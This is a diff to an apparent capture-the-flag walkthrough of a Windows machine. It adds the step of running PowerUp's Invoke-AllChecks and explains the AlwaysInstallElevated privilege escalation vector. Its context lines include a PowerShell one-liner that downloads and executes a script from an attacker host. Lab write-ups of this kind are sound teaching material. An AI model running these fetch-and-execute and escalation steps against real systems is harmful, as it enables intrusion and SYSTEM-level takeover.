@@ -133,6 +133,11 @@ I uploaded and run the PowerUp script to identify privilege escalation vectors:
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.11:8000/PowerUp.ps1')
 ```
 
+Then in the victim's machine run:
+```
+Invoke-AllChecks
+```
+
 The scan revealed that the **AlwaysInstallElevated** registry key was set to 1. The **AlwaysInstallElevated registry** key is a known privilege escalation vector in Windows systems. When this key is set to 1, it allows MSI files to be installed with elevated privileges by non-administrator users. This is a major security risk because attackers can abuse it to execute arbitrary MSI packages with SYSTEM privileges.
 ![alt text](Snapshots/Love-image-16.png)
 
